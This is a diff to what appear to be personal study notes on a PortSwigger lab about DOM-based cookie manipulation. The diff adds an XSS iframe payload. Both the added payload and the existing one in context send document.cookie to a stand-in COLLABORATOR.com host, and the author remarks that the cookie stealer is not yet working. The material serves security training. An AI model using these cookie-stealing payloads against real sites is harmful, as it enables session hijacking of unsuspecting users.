@@ -292,9 +292,13 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ```html
 <iframe src="https://TARGET.net/product?productId=1&'><script>fetch(`https://COLLABORATOR.com/?dc=`+btoa(document.cookie))</script>" onload="https://TARGET.net/">
 </iframe>
+```
+
+```html
+<iframe src="https://TARGET.net/product?productId=1&'><img src=x onerror=this.src='http://COLLABORATOR.com/?exploit='+document.cookie>" onload="https://TARGET.net/">
 ```  
 
->On exploit server host iframe ........
+I am unable to get a working cookie stealer payload for the vulnerability lab......
 
 [PortSwigger Lab: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)  
   
